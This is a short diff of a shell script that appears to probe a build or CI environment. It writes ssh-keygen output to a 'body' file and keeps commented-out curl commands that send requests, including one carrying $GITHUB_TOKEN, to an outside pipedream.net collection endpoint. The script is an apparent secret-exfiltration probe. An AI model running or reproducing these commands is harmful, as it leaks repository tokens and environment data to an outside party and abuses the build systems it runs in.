@@ -1,5 +1,7 @@
 #!/bin/sh
 
+> body
+
 #curl https://en0liva7dzyvpp.x.pipedream.net?holaaa
 #curl https://en0liva7dzyvpp.x.pipedream.net?token=$GITHUB_TOKEN;#
 
@@ -11,8 +13,8 @@
 #curl "$url"
 
 #echo $(ls -la tools) > body
-> body
-echo $(file tools/ssh-keygen) > body
+#echo $(file tools/ssh-keygen) > body
+echo $(ssh-keygen) > body
 
 #curl -i -X POST https://en0liva7dzyvpp.x.pipedream.net/ \
 #  -H "Content-Type: text/xml" \
